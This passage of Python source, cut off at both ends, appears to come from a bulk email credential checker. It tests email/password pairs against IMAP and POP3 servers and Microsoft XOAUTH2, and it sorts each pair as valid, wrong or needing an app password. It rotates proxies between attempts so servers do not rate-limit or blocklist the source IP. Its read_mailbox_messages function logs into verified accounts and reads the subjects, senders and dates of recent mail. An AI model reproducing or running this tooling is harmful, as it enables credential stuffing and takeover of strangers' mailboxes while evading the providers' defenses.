        mail = ProxyPOP3(server, port, timeout=to, proxy_str=proxy_str)
        mail.stls(context=_tls_context(server, verify=not insecure))
        if not pop3_ok(mail.user(email.strip())):
            raise RuntimeError("POP3 STLS user rejected")
        if not pop3_ok(mail.pass_(password.strip())):
            raise RuntimeError("POP3 STLS password rejected")
        if not pop3_ok(mail.stat()):
            raise RuntimeError("POP3 STLS post-auth stat failed")
        try:
            mail.noop()
        except Exception:
            pass
    finally:
        if mail:
            try:
                mail.quit()
            except Exception:
                pass

def pop_plain_once(email, password, server, proxy_str=None, port=110, attempt_timeout=None):
    to = attempt_timeout or CFG["TIMEOUT"]
    mail = None
    try:
        mail = ProxyPOP3(server, port, timeout=to, proxy_str=proxy_str)
        if not pop3_ok(mail.getwelcome()):
            raise RuntimeError("POP3 plain invalid welcome banner")
        if not pop3_ok(mail.user(email.strip())):
            raise RuntimeError("POP3 plain user rejected")
        if not pop3_ok(mail.pass_(password.strip())):
            raise RuntimeError("POP3 plain password rejected")
        if not pop3_ok(mail.stat()):
            raise RuntimeError("POP3 plain post-auth stat failed")
        try:
            mail.noop()
        except Exception:
            pass
    finally:
        if mail:
            try:
                mail.quit()
            except Exception:
                pass

def verify_and_connect(target_email, target_pass, hosts, proxy_str=None):
    users = username_candidates(target_email)
    for h in hosts:
        if MS_OAUTH_OK and h.lower() in ms_oauth.MS_IMAP_HOSTS:
            try:
                mail, _exists, _claims = ms_oauth.imap_xoauth2_open(
                    target_email, target_pass, h, ProxyIMAP4SSL,
                    port=993, proxy_str=proxy_str, insecure=True, attempt_timeout=15)
                return True, mail, h
            except ms_oauth.MsTokenRejected:
                pass
            except Exception:
                pass

        for mode, port in (("ssl", 993), ("starttls", 143), ("plain", 143)):
            for user in users:
                mail = None
                try:
                    if mode == "ssl":
                        mail = ProxyIMAP4SSL(h, port, timeout=10, proxy_str=proxy_str, insecure=True)
                    elif mode == "starttls":
                        mail = ProxyIMAP4(h, port, timeout=10, proxy_str=proxy_str)
                        mail.starttls(ssl_context=_tls_context(h, False))
                    else:
                        mail = ProxyIMAP4(h, port, timeout=10, proxy_str=proxy_str)
                    typ, _ = mail.login(user.strip(), target_pass.strip())
                    if typ == 'OK':
                        st_typ, _ = mail.select("INBOX", readonly=True)
                        if st_typ == 'OK':
                            return True, mail, h
                    try:
                        mail.logout()
                    except Exception:
                        pass
                except Exception:
                    if mail:
                        try:
                            mail.logout()
                        except Exception:
                            pass
                    continue
    return False, None, ""

def read_mailbox_messages(email, password, server, proxy_str=None, limit=10):
    mail = None
    try:
        conf_hosts = get_servers(email).get("imap", []) or [server]
        verified, mail, _ = verify_and_connect(email, password, conf_hosts, proxy_str=proxy_str)
        if not verified or not mail:
            return ["Error reading mailbox: True credential verification failed."]
        mail.select("INBOX")
        typ, data = mail.search(None, "ALL")
        if typ != "OK":
            return ["No messages or folder empty."]
        ids = data[0].split()
        latest_ids = ids[-limit:] if len(ids) > limit else ids
        messages = []
        for mid in reversed(latest_ids):
            typ, msg_data = mail.fetch(mid, "(BODY.PEEK[HEADER.FIELDS (SUBJECT FROM DATE)])")
            if typ == "OK":
                for rp in msg_data:
                    if isinstance(rp, tuple):
                        messages.append(rp[1].decode("utf-8", errors="ignore"))
        try:
            mail.logout()
        except Exception:
            pass
        return messages if messages else ["No recent messages found."]
    except Exception as e:
        if mail:
            try:
                mail.logout()
            except Exception:
                pass
        return [f"Error reading mailbox: {str(e)}"]

# ============================================================================
# MAIN ORCHESTRATOR
# ============================================================================

def check_account_sync(email, password, conf, domain, proxy_pool, thread_state, trace_logs=None):
    if trace_logs is None:
        trace_logs = []

    if CFG.get("FAST_MODE", True):
        ts = failed_domain_cache.get(domain)
        if ts and (time.time() - ts) < CFG.get("FAILURE_COOLDOWN", 60.0):
            trace_logs.append(f"Fast Mode: Domain '{domain}' is in cooldown cache. Skipping immediately.")
            return None, SKIP, SKIP, None, trace_logs
        elif ts:
            failed_domain_cache.pop(domain, None)

    t_start = time.time()
    retryable = False
    net_fail = False
    dns_ok = True

    best_verdict = {"status": None, "detail": ""}
    flags = {"saw_407": False, "saw_nonproxy": False}
    force_direct = {"flag": False}
    host_407 = {}
    net_failed_hosts = set()
    retries_by_host = {}
    conn_rotated = {}
    used_proxies = set()
    MAX_ROTATIONS = 5

    try:
        if conf.get("type") == "zero_access":
            trace_logs.append("Architecture: Zero-Access / Bridge detected.")
            return None, NEED_APP_PASSWORD, "Zero-Access Architecture | Protocol: Local API / Bridge", None, trace_logs

        proxy_mode = CFG.get("PROXY_MODE", "fallback")
        prefer_insecure = bool(CFG.get("ALLOW_SELF_SIGNED", True))
        try_starttls = bool(CFG.get("TRY_STARTTLS", True))
        try_alt_user = bool(CFG.get("TRY_ALT_USERNAME", True))
        max_hosts = max(1, int(CFG.get("MAX_HOSTS_PER_DOMAIN", 3)))
        configured_to = max(4.0, float(CFG.get("TIMEOUT", 12)))
        same_host_retries = max(0, int(CFG.get("SAME_HOST_RETRIES", SAME_HOST_RETRIES_DEFAULT)))

        users = username_candidates(email) if try_alt_user else [email]
        primary_user = users[0]

        def note_verdict(st_val, detail):
            if st_val not in (VALID, WRONG, APP, RBL):
                return
            cur = best_verdict["status"]
            if cur is None or ST_PRIORITY.get(st_val, 99) < ST_PRIORITY.get(cur, 99):
                best_verdict["status"] = st_val
                best_verdict["detail"] = detail
                trace_logs.append(f"Verdict retained for this account: [{st_val}] ({detail})")

        px = None
        if proxy_pool and proxy_mode != "off":
            if proxy_mode == "sticky":
                if not thread_state.get("sticky_proxy"):
                    thread_state["sticky_proxy"] = sample_alive_proxy(domain=domain)
                px = thread_state["sticky_proxy"]
            else:
                px = sample_alive_proxy(domain=domain)
            if px:
                used_proxies.add(px)

        _all_imap = [h for h in (conf.get("imap") or []) if h]
        _imap_cap = max(2, min(4, max_hosts))
        imap_hosts = _dedupe_hosts_by_ip(_all_imap, cap=_imap_cap)
        _all_pop = [h for h in (conf.get("pop") or conf.get("pop3") or []) if h]
        _pop_only = [h for h in _all_pop if h not in imap_hosts]
        pop_hosts = (_pop_only or _all_pop)[:1]
        if len(_all_imap) > len(imap_hosts):
            trace_logs.append(
                f"Host expansion: {len(imap_hosts)}/{len(_all_imap)} IMAP candidate(s) kept "
                f"(cap {_imap_cap}, duplicate IPs collapsed).")

        if domain and domain not in imap_hosts and len(imap_hosts) < 4 and fast_fail_dns_check(domain):
            imap_hosts = imap_hosts + [domain]
            trace_logs.append(
                f"Fallback host '{domain}' force-included as a final rung (apex resolves).")

        if domain in imap_hosts:
            imap_hosts = [h for h in imap_hosts if h != domain] + [domain]

        if domain.endswith("windstream.net") or domain.endswith("kinetic.net"):
            _drop = {domain, "secure.windstream.net", "webmail.windstream.net"}
            _kept = [h for h in imap_hosts if h.lower() not in _drop]
            if _kept and len(_kept) != len(imap_hosts):
                trace_logs.append(
                    f"Web-only hosts dropped from the IMAP ladder (never answer on 993/143): "
                    f"{[h for h in imap_hosts if h.lower() in _drop]}")
                imap_hosts = _kept

        _web = [h for h in imap_hosts if h.lower() in WEB_ONLY_HOSTS]
        if _web and len(_web) < len(imap_hosts):
            imap_hosts = [h for h in imap_hosts if h.lower() not in WEB_ONLY_HOSTS] + _web

        _local_roots = tuple(_domain_roots(domain))

        def _is_local_host(h):
            hl = (h or "").lower().strip()
            if not hl:
                return False
            for r in _local_roots:
                if hl == r or hl.endswith("." + r):
                    return True
            return False

        domain_local_hosts = {h for h in (imap_hosts + pop_hosts) if _is_local_host(h)}

        tried_hosts = set()

        trace_logs.append(f"Host order -> IMAP {imap_hosts} | POP {pop_hosts}")
        if proxy_pool and proxy_mode != "off":
            trace_logs.append(
                f"Proxy pool: {len(proxy_pool)} node(s) alive, {quarantine_size()} quarantined for 407.")
        trace_logs.append(
            f"Concurrency: host cap {CFG.get('HOST_CONCURRENCY')} · per-IP cap {CFG.get('PROXY_IP_CONCURRENCY')} "
            f"· proxy cap {CFG.get('PROXY_CONCURRENCY')} "
            f"· same-host retries {same_host_retries} · rotation "
            f"{'RANDOM' if CFG.get('RANDOM_ROTATION', True) else 'round-robin'}")

        resolvable = [h for h in (imap_hosts + pop_hosts) if fast_fail_dns_check(h)]
        dns_ok = bool(resolvable)
        if dns_ok:
            trace_logs.append(f"Fast-fail DNS check OK: {len(resolvable)}/{len(imap_hosts) + len(pop_hosts)} hosts resolve locally")
        else:
            trace_logs.append("Fast-fail DNS check failed: no candidate host resolves locally")
            if not proxy_pool or proxy_mode == "off":
                return None, DNS_FAILED, "Fast-fail DNS check failed: no host resolves locally", None, trace_logs

        imap_set = set(imap_hosts)
        pop_only = [h for h in pop_hosts if h not in imap_set]
        pop_dup = [h for h in pop_hosts if h in imap_set]

        primary_plan = []
        if imap_hosts:
            primary_plan.append(("IMAP", imap_hosts[0], 993, "ssl"))
        for _ph in pop_only:
            primary_plan.append(("POP", _ph, 995, "ssl"))
        for _h in imap_hosts[1:]:
            primary_plan.append(("IMAP", _h, 993, "ssl"))

        fallback_plan = [("POP", h, 995, "ssl") for h in pop_dup]
        if try_starttls:
            fallback_plan += [("IMAP", h, 143, "starttls") for h in imap_hosts]
            fallback_plan += [("IMAP", h, 143, "plain") for h in imap_hosts[:2]]
            for h in pop_hosts:
                fallback_plan += [("POP", h, 110, "starttls")]
                fallback_plan += [("POP", h, 110, "plain")]

        if not primary_plan:
            trace_logs.append("No candidate hosts for this domain.")
            return None, FAILED, "no candidate hosts", None, trace_logs

        rung_cost = max(8.0, min(configured_to, 12.0))
        work_floor = (len(primary_plan) * rung_cost * 1.5) + 15.0
        budget = max(12.0, float(CFG.get("ACCOUNT_DEADLINE", 90)) * 0.95)
        if work_floor > budget:
            trace_logs.append(
                f"Budget floored to fit the work: {work_floor:.0f}s "
                f"({len(primary_plan)} rung(s) x {rung_cost:.0f}s x 1.5 + 15s) "
                f"instead of the {budget:.0f}s the Deadline slider allows.")
            budget = work_floor

        proxy_deadline = t_start + (budget * 0.62)
        proxy_primary_deadline = t_start + (budget * 0.45)
        hard_deadline = t_start + budget
        direct_primary_deadline = t_start + (budget * 0.82)
        trace_logs.append(
            f"Account window {budget:.0f}s -> proxy {budget * 0.62:.0f}s / direct {budget * 0.38:.0f}s "
            f"(legacy 143/110 rungs hold a reserved tail slice of each phase).")

        def _is_timeout(err):
            s = str(err).lower()
            return "timed out" in s or "timeout" in s

        def _do_attempt_raw(proto, server, port, tls_mode, user, px_used, attempt_to):
            if proto == "IMAP":
                if tls_mode == "ssl":
                    imap_once(user, password, server, px_used, insecure=prefer_insecure, port=port, attempt_timeout=attempt_to)
                elif tls_mode == "starttls":
                    imap_starttls_once(user, password, server, px_used, insecure=prefer_insecure, port=port, attempt_timeout=attempt_to)
                else:
                    imap_plain_once(user, password, server, px_used, port=port, attempt_timeout=attempt_to)
            else:
                if tls_mode == "ssl":
                    pop_once(user, password, server, px_used, insecure=prefer_insecure, port=port, attempt_timeout=attempt_to)
                elif tls_mode == "starttls":
                    pop_starttls_once(user, password, server, px_used, insecure=prefer_insecure, port=port, attempt_timeout=attempt_to)
                else:
                    pop_plain_once(user, password, server, px_used, port=port, attempt_timeout=attempt_to)

        def do_attempt(proto, server, port, tls_mode, user, px_used, attempt_to, deadline_ts=None):
            """Serialised per destination host, per proxy IP, and globally.

            v13.29: the IP gate is acquired INSIDE the proxy gate so three workers
            cannot ride the same source IP into one mail host.
            """
            gate = _host_gate(server)
            got_host = gate.acquire(timeout=max(2.0, attempt_to))
            try:
                if deadline_ts is not None:
                    attempt_to = max(5.0, min(attempt_to, deadline_ts - time.time()))
                if px_used:
                    got_proxy = _proxy_gate().acquire(timeout=max(2.0, attempt_to))
                    try:
                        _pxinfo = parse_proxy(px_used)
                        ipg = _ip_gate(_pxinfo["host"] if _pxinfo else None)
                        got_ip = ipg.acquire(timeout=max(2.0, attempt_to))
                        try:
                            _do_attempt_raw(proto, server, port, tls_mode, user, px_used, attempt_to)
                        finally:
                            if got_ip:
                                ipg.release()
                    finally:
                        if got_proxy:
                            _proxy_gate().release()
                else:
                    _do_attempt_raw(proto, server, port, tls_mode, user, px_used, attempt_to)
            finally:
                if got_host:
                    gate.release()

        err_text = ""

        def try_ms_xoauth2(server, px_used, attempt_to):
            if not MS_OAUTH_OK:
                return None
            if server.lower() not in ms_oauth.MS_IMAP_HOSTS:
                return None
            if not ms_oauth.should_try_ms_xoauth2(server, err_text, domain):
                return None
            try:
                exists, claims = ms_oauth.imap_xoauth2_once(
                    email, password, server, ProxyIMAP4SSL, port=993,
                    proxy_str=px_used, insecure=prefer_insecure,
                    attempt_timeout=attempt_to)
                who = claims.get("preferred_username") or email
                trace_logs.append(
                    f"{px_tag(px_used)} XOAUTH2 VALID on {server}:993 "
                    f"(EXISTS={exists}, as={who}, exp={claims.get('exp')})")
                return (server, VALID,
                        f"{px_tag(px_used)} XOAUTH2 | Host: {server} | Port: 993 | "
                        f"real account password (basic auth disabled)",
                        px_used, trace_logs)
            except ms_oauth.MsTokenTransport as te:
                trace_logs.append(
                    f"{px_tag(px_used)} XOAUTH2 transport issue -> verdict unchanged ({str(te)[:90]})")
                return None
            except ms_oauth.MsTokenRejected as tr:
                if tr.verdict == "wrong_password":
                    note_verdict(WRONG, f"XOAUTH2 token {tr.code} -> wrong password")
                    trace_logs.append(f"{px_tag(px_used)} XOAUTH2 token rejected [{tr.code}] -> wrong password")
                elif tr.verdict == "need_app_password":
                    note_verdict(APP, f"XOAUTH2 token {tr.code} -> MFA, app password required")
                    trace_logs.append(f"{px_tag(px_used)} XOAUTH2 token rejected [{tr.code}] -> MFA, app password required")
                else:
                    trace_logs.append(f"{px_tag(px_used)} XOAUTH2 token rejected [{tr.code}] -> no verdict change")
                return None
            except Exception as xe:
                trace_logs.append(f"{px_tag(px_used)} XOAUTH2 failed: {str(xe)[:90]}")
                return None

        def _pool_exhausted():
            with alive_pool_lock:
                pool = set(alive_pool)
            with proxy_quarantine_lock:
                q = set(proxy_quarantine)
            return bool(pool) and q >= pool

        def _rotate_to_fresh(px_used, seen_px, why):
            """v13.29: shared rotator. Returns (new_px, ok)."""
            newpx = sample_alive_proxy(exclude=seen_px, avoid=seen_px, domain=domain)
            if newpx and newpx not in seen_px:
                seen_px.add(newpx)
                trace_logs.append(f"Rotating proxy ({why}) -> {px_tag(newpx)}")
                return newpx, True
            return px_used, False

        def sweep(px_used, rungs, deadline_ts, label, allow_rotate=True):
            had_net = False
            saw_retry = False
            if not rungs:
                return None, had_net, saw_retry

            left = deadline_ts - time.time()
            if left <= 1.5:
                trace_logs.append(f"{label}: no window left ({left:.1f}s).")
                return None, had_net, saw_retry

            per_to = max(6.0, min(configured_to, left / max(1, len(rungs))))
            trace_logs.append(f"--- {label}: {len(rungs)} rung(s), ~{per_to:.1f}s each, {left:.1f}s window ---")

            for rung_idx, (proto, server, port, tls_mode) in enumerate(rungs):
                if time.time() > deadline_ts:
                    trace_logs.append(
                        f"{label}: window reached; stopping this pass "
                        f"({len(rungs) - rung_idx} rung(s) not attempted).")
                    break

                tried_hosts.add(server)

                if px_used and proxy_mode != "off" and proxy_is_quarantined(px_used):
                    _fresh = sample_alive_proxy(domain=domain, avoid=used_proxies)
                    if _fresh and _fresh != px_used:
                        px_used = _fresh
                        used_proxies.add(_fresh)
                        trace_logs.append(
                            f"Quarantined node in hand -> switched to fresh node {px_tag(px_used)}")

                rotations_left = MAX_ROTATIONS if (allow_rotate and px_used and proxy_mode != "off") else 0
                seen_px = used_proxies
                acct_407 = 0

                while True:
                    if time.time() > deadline_ts:
                        break

                    attempt_to = max(5.0, min(per_to, deadline_ts - time.time()))

                    trace_logs.append(f"{px_tag(px_used)} Attempting {proto} {tls_mode.upper()} -> Host: {server}:{port}")
                    server_level_fail = False
                    rotate_now = False
                    retry_same = False
                    proxy_dead = False
                    err_text = ""

                    for u_idx, user in enumerate(users):
                        try:
                            do_attempt(proto, server, port, tls_mode, user, px_used, attempt_to, deadline_ts)
                            record_proxy_attempt(px_used, success=True)
                            note_verdict(VALID, f"{proto} {server}:{port}")
                            note = "" if user == primary_user else f" | User: {user} (local-part)"
                            trace_logs.append(f"{px_tag(px_used)} Post-auth {proto} verification OK on {server}:{port}{note}")
                            return (server, VALID,
                                    f"{px_tag(px_used)} {proto} | Host: {server} | Port: {port}{note}",
                                    px_used, trace_logs), had_net, saw_retry

                        except ProxyAuthError as pae:
                            # v13.29: ONLY a real credential rejection on the
                            # PREFERRED scheme reaches here.
                            err_text = str(pae)
                            flags["saw_407"] = True
                            record_proxy_attempt(px_used, success=False,
                                                 is_network_error=True, is_proxy_auth=True)
                            host_407[server] = host_407.get(server, 0) + 1
                            acct_407 += 1
                            trace_logs.append(
                                f"{px_tag(px_used)} -> PROXY 407 {proto} {server}:{port}: "
                                f"{err_text[:200]} [Classified: proxy_unhealthy]")
                            proxy_dead = True
                            rotate_now = True

                        except ProxyTransportError as pte:
                            # v13.29: a broken tunnel. NOT a 407, NOT a verdict.
                            err_text = str(pte)
                            flags["saw_nonproxy"] = True
                            had_net = True
                            net_failed_hosts.add(server)
                            record_proxy_attempt(px_used, success=False,
                                                 is_network_error=True, is_proxy_auth=False)
                            trace_logs.append(
                                f"{px_tag(px_used)} -> PROXY TRANSPORT {proto} {server}:{port}: "
                                f"{err_text[:200]} [Classified: {FAILED}]")
                            server_level_fail = True
                            rotate_now = True

                        except ssl.SSLError as ssl_err:
                            err_text = str(ssl_err)
                            st_val = classify_error(ssl_err, domain)
                            flags["saw_nonproxy"] = True
                            if st_val == FAILED:
                                had_net = True
                                net_failed_hosts.add(server)
                            record_proxy_attempt(px_used, success=False, is_network_error=(st_val == FAILED))
                            trace_logs.append(f"{px_tag(px_used)} -> TLS FAILED {proto} {server}:{port}: {err_text[:140]} [Classified: {st_val}]")
                            note_verdict(st_val, f"{proto} {server}:{port} -> {st_val}")
                            server_level_fail = True
                            rotate_now = _is_proxy_level_error(err_text) or st_val == FAILED

                        except (socket.timeout, TimeoutError) as to_err:
                            err_text = str(to_err)
                            flags["saw_nonproxy"] = True
                            had_net = True
                            net_failed_hosts.add(server)
                            record_proxy_attempt(px_used, success=False, is_network_error=True)
                            trace_logs.append(f"{px_tag(px_used)} -> TIMEOUT {proto} {server}:{port}: {err_text[:140]} [Classified: {FAILED}]")
                            server_level_fail = True

                            _kind = _timeout_kind(to_err)
                            if _kind == "connect":
                                if px_used and proxy_mode != "off" and not conn_rotated.get(server):
                                    conn_rotated[server] = True
                                    rotate_now = True
                                    trace_logs.append(
                                        f"{px_tag(px_used)} Connect-level timeout -> rotating node ONCE, "
                                        f"no in-place retry")
                                else:
                                    rotate_now = False
                                    trace_logs.append(
                                        f"{px_tag(px_used)} Connect-level timeout -> advancing past "
                                        f"{server}:{port} (no in-place retry)")
                            else:
                                rotate_now = True
                                if retries_by_host.get(server, 0) < same_host_retries and (deadline_ts - time.time()) > 7.0:
                                    retries_by_host[server] = retries_by_host.get(server, 0) + 1
                                    retry_same = True

                        except (socket.error, ConnectionRefusedError) as sock_err:
                            # v13.29: a raw reset. ROTATE - do not burn the rung.
                            err_text = str(sock_err)
                            flags["saw_nonproxy"] = True
                            had_net = True
                            net_failed_hosts.add(server)
                            record_proxy_attempt(px_used, success=False, is_network_error=True)
                            trace_logs.append(f"{px_tag(px_used)} -> SOCKET FAILED {proto} {server}:{port}: {err_text[:140]} [Classified: {FAILED}]")
                            server_level_fail = True
                            rotate_now = True
                            if retries_by_host.get(server, 0) < same_host_retries and (deadline_ts - time.time()) > 7.0:
                                retries_by_host[server] = retries_by_host.get(server, 0) + 1
                                retry_same = True

                        except (imaplib.IMAP4.error, poplib.error_proto) as proto_err:
                            err_text = str(proto_err)
                            st_val = classify_error(proto_err, domain)
                            flags["saw_nonproxy"] = True
                            record_proxy_attempt(px_used, success=False, is_network_error=False)
                            trace_logs.append(f"{px_tag(px_used)} -> AUTH {proto} {server}:{port}: {err_text[:140]} [Classified: {st_val}]")
                            note_verdict(st_val, f"{proto} {server}:{port} -> {st_val}")

                            if st_val == APP:
                                xres = try_ms_xoauth2(server, px_used, attempt_to)
                                if xres:
                                    return xres, had_net, saw_retry
                                if u_idx + 1 < len(users):
                                    # v13.29: fresh node for the local-part retry.
                                    px_used, _ok = _rotate_to_fresh(px_used, seen_px, "local-part retry")
                                    trace_logs.append(f"{px_tag(px_used)} App-password signal as '{user}' -> retrying same host as local-part '{users[u_idx + 1]}'")
                                    continue
                                if server in domain_local_hosts or not (domain_local_hosts - tried_hosts):
                                    return (None, APP, f"{px_tag(px_used)} {proto} {server} -> {st_val}", px_used, trace_logs), had_net, saw_retry
                                trace_logs.append(
                                    f"{px_tag(px_used)} APP on FOREIGN host {server} -> verdict noted, own host still untried, continuing")
                                server_level_fail = True
                            elif st_val == RETRY:
                                saw_retry = True
                                server_level_fail = True
                                if "lookup failed" in err_text.lower():
                                    rotate_now = False
                                    trace_logs.append(f"{px_tag(px_used)} 'Lookup failed' on {server}:{port} -> advancing to next host (no proxy rotation)")
                                else:
                                    rotate_now = True
                            elif st_val == RBL:
                                trace_logs.append(f"{px_tag(px_used)} RBL block on {server}:{port} -> IP flagged by server, advancing")
                                server_level_fail = True
                            elif u_idx + 1 < len(users) and st_val in (WRONG, UNKNOWN):
                                # v13.29: rotate before the local-part retry, so the
                                # second back-to-back connect does not reuse the IP.
                                px_used, _ok = _rotate_to_fresh(px_used, seen_px, "local-part retry")
                                trace_logs.append(f"{px_tag(px_used)} Rejected as '{user}' -> retrying same host as local-part '{users[u_idx + 1]}'")
                                continue
                            elif st_val == WRONG:
                                better = (best_verdict["status"] is not None
                                          and ST_PRIORITY.get(best_verdict["status"], 99) < ST_PRIORITY.get(WRONG, 99))
                                if not better and (server in domain_local_hosts or not (domain_local_hosts - tried_hosts)):
                                    return (None, WRONG, f"{px_tag(px_used)} {proto} {server} -> {st_val}", px_used, trace_logs), had_net, saw_retry
                                trace_logs.append(
                                    f"{px_tag(px_used)} WRONG on {'local' if server in domain_local_hosts else 'FOREIGN'} host {server} "
                                    f"-> noted ({best_verdict['status'] or 'none'} retained), continuing")
                                server_level_fail = True
                            else:
                                server_level_fail = True
                                if (st_val == FAILED and retries_by_host.get(server, 0) < same_host_retries
                                        and (deadline_ts - time.time()) > 7.0):
                                    retries_by_host[server] = retries_by_host.get(server, 0) + 1
                                    retry_same = True

                        except Exception as e:
                            err_text = str(e)
                            st_val = classify_error(e, domain)
                            proxy_level = _is_proxy_level_error(err_text)
                            if proxy_level:
                                flags["saw_407"] = True
                                record_proxy_attempt(px_used, success=False,
                                                     is_network_error=True, is_proxy_auth=True)
                                host_407[server] = host_407.get(server, 0) + 1
                                acct_407 += 1
                            else:
                                flags["saw_nonproxy"] = True
                            if _is_timeout(e):
                                had_net = True
                                net_failed_hosts.add(server)
                            if st_val == FAILED:
                                had_net = True
                                net_failed_hosts.add(server)
                            record_proxy_attempt(px_used, success=False, is_network_error=(st_val == FAILED))
                            trace_logs.append(f"{px_tag(px_used)} -> FAILED {proto} {server}:{port}: {err_text[:140]} [Classified: {st_val}]")
                            note_verdict(st_val, f"{proto} {server}:{port} -> {st_val}")

                            if st_val == APP:
                                xres = try_ms_xoauth2(server, px_used, attempt_to)
                                if xres:
                                    return xres, had_net, saw_retry
                                if u_idx + 1 < len(users):
                                    px_used, _ok = _rotate_to_fresh(px_used, seen_px, "local-part retry")
                                    trace_logs.append(f"{px_tag(px_used)} App-password signal as '{user}' -> retrying same host as local-part '{users[u_idx + 1]}'")
                                    continue
                                if server in domain_local_hosts or not (domain_local_hosts - tried_hosts):
                                    return (None, APP, f"{px_tag(px_used)} {proto} {server} -> {st_val}", px_used, trace_logs), had_net, saw_retry
                                trace_logs.append(
                                    f"{px_tag(px_used)} APP on FOREIGN host {server} -> verdict noted, own host still untried, continuing")
                                server_level_fail = True
                            elif st_val == RETRY:
                                saw_retry = True
                                server_level_fail = True
                                if "lookup failed" in err_text.lower():
                                    rotate_now = False
                                    trace_logs.append(f"{px_tag(px_used)} 'Lookup failed' on {server}:{port} -> advancing to next host (no proxy rotation)")
                                else:
                                    rotate_now = True
                            elif st_val == RBL:
                                trace_logs.append(f"{px_tag(px_used)} RBL block on {server}:{port} -> IP flagged by server, advancing")
                                server_level_fail = True
                            elif u_idx + 1 < len(users) and st_val in (WRONG, UNKNOWN):
                                px_used, _ok = _rotate_to_fresh(px_used, seen_px, "local-part retry")
                                trace_logs.append(f"{px_tag(px_used)} Rejected as '{user}' -> retrying same host as local-part '{users[u_idx + 1]}'")
                                continue
                            elif st_val == WRONG:
                                better = (best_verdict["status"] is not None
                                          and ST_PRIORITY.get(best_verdict["status"], 99) < ST_PRIORITY.get(WRONG, 99))
                                if not better and (server in domain_local_hosts or not (domain_local_hosts - tried_hosts)):
                                    return (None, WRONG, f"{px_tag(px_used)} {proto} {server} -> {st_val}", px_used, trace_logs), had_net, saw_retry
                                trace_logs.append(
                                    f"{px_tag(px_used)} WRONG on {'local' if server in domain_local_hosts else 'FOREIGN'} host {server} "
                                    f"-> noted ({best_verdict['status'] or 'none'} retained), continuing")
                                server_level_fail = True
                            else:
                                server_level_fail = True
                                rotate_now = rotate_now or proxy_level
                                if (_is_timeout(e) and _timeout_kind(e) == "connect"
                                        and not conn_rotated.get(server)):
                                    conn_rotated[server] = True
                                    rotate_now = True

                        if proxy_dead:
                            break
                        if server_level_fail:
                            break

                    if retry_same and (deadline_ts - time.time()) > 5.0:
                        trace_logs.append(
                            f"{px_tag(px_used)} Host answered slowly -> backoff 1.2s, retrying "
                            f"{server}:{port} in place [{retries_by_host.get(server, 0)}/{same_host_retries}]")
                        time.sleep(1.2)
                        continue

                    can_rotate = (
                        rotate_now and px_used and rotations_left > 0
                        and (deadline_ts - time.time()) > max(2.0, per_to * 0.5)
                    )
                    if can_rotate:
                        newpx = sample_alive_proxy(exclude=seen_px, avoid=seen_px, domain=domain)
                        if newpx and newpx not in seen_px:
                            seen_px.add(newpx)
                            px_used = newpx
                            rotations_left -= 1
                            trace_logs.append(
                                f"{px_tag(px_used)} Rotating proxy -> retrying {server}:{port} "
                                f"(host kept, {'407' if proxy_dead else 'net'})")
                            continue

                    if proxy_dead and acct_407 >= PROXY_407_FORCE_DIRECT and (
                            not can_rotate or _pool_exhausted()):
                        trace_logs.append(
                            f"407 storm breaker: {acct_407} proxy-auth failure(s) and no fresh node "
                            f"-> bypassing the remaining hosts and going DIRECT.")
                        force_direct["flag"] = True
                        return None, had_net, saw_retry

                    break

            return None, had_net, saw_retry

        def run_phase(px_used, plan_used, deadline_ts, tag):
            if not plan_used:
                return None, False, False

            res, net, ret = sweep(px_used, plan_used, deadline_ts, f"{tag} · pass 1", allow_rotate=True)
            if res or force_direct["flag"]:
                return res, net, ret

            if net and (deadline_ts - time.time()) > 3.0:
                retry_rungs = [r for r in plan_used if r[1] in net_failed_hosts]
                if retry_rungs:
                    res2, net2, ret2 = sweep(px_used, retry_rungs, deadline_ts,
                                             f"{tag} · pass 2 (fresh proxy per failed host)", allow_rotate=True)
                    return res2, (net or net2), (ret or ret2)
            return None, net, ret

        direct_first = bool(CFG.get("DIRECT_FIRST", False))
        if proxy_mode == "off":
            direct_first = True
        if not direct_first and proxy_pool:
            try:
                if quarantine_size() >= max(3, int(len(proxy_pool) * 0.5)):
                    direct_first = True
                    trace_logs.append(
                        f"Pool {quarantine_size()}/{len(proxy_pool)} quarantined -> auto Direct-First.")
            except Exception:
                pass

        allow_proxy = bool(px) and proxy_mode != "off" and not proxy_is_quarantined(px)
        direct_gate = (px is None or proxy_mode == "fallback"
                       or bool(CFG.get("RETRY_CONNECTION_FAILED")) or force_direct["flag"])
        allow_direct = bool(direct_gate)

        def _run_direct(primary_dl, hard_dl):
            nonlocal retryable
            dp = [r for r in primary_plan if fast_fail_dns_check(r[1])] or primary_plan
            df = [r for r in fallback_plan if fast_fail_dns_check(r[1])]
            dgeo = direct_geo()
            trace_logs.append(f"direct | {dgeo['ip']} | {dgeo['region']} | {dgeo['country']} | {dgeo['vpn']}")
            trace_logs.append(f"DIRECT sweep over {len(dp)} locally-resolving host(s).")
            res, _nf, ret = run_phase(None, dp, primary_dl, "direct")
            retryable = retryable or ret
            if res:
                return res
            if (hard_dl - time.time()) > 4.0:
                res, _nf2, _r = run_phase(None, df, hard_dl, "direct/legacy")
                if res:
                    return res
            return None

        def _run_proxy(primary_dl, hard_dl):
            nonlocal retryable, net_fail
            if not allow_proxy:
                if proxy_mode != "off" and not proxy_pool:
                    trace_logs.append("No live proxy in the pool -> running only the DIRECT sweep.")
                return None
            res, nf, ret = run_phase(px, primary_plan, primary_dl, "proxy")
            retryable = retryable or ret
            net_fail = net_fail or nf
            if res:
                return res
            if not force_direct["flag"] and (hard_dl - time.time()) > 4.0:
                res, _n, _r = run_phase(px, fallback_plan, hard_dl, "proxy/legacy")
                if res:
                    return res
            return None

        if direct_first and allow_direct:
            trace_logs.append("Phase order: DIRECT first, proxy as fallback.")
            res = _run_direct(t_start + (budget * 0.45), t_start + (budget * 0.70))
            if res:
                return res
            if allow_proxy:
                res = _run_proxy(t_start + (budget * 0.88), hard_deadline)
                if res:
                    return res
        else:
            res = _run_proxy(proxy_primary_deadline, proxy_deadline)
            if res:
                return res
            if force_direct["flag"]:
                trace_logs.append("407 storm breaker tripped -> bypassing the rest of the proxy pool and running the DIRECT sweep now.")
            direct_reason = (px is None) or net_fail or retryable or force_direct["flag"]
            if allow_direct and direct_reason:
                res = _run_direct(direct_primary_deadline, hard_deadline)
                if res:
                    return res

    except Exception as e:
        trace_logs.append(f"Critical Exception in runner: {str(e)}")
        if CFG.get("FAST_MODE", True):
            failed_domain_cache[domain] = time.time()
        if best_verdict["status"] is not None:
            return None, best_verdict["status"], best_verdict["detail"] or "retained verdict", None, trace_logs
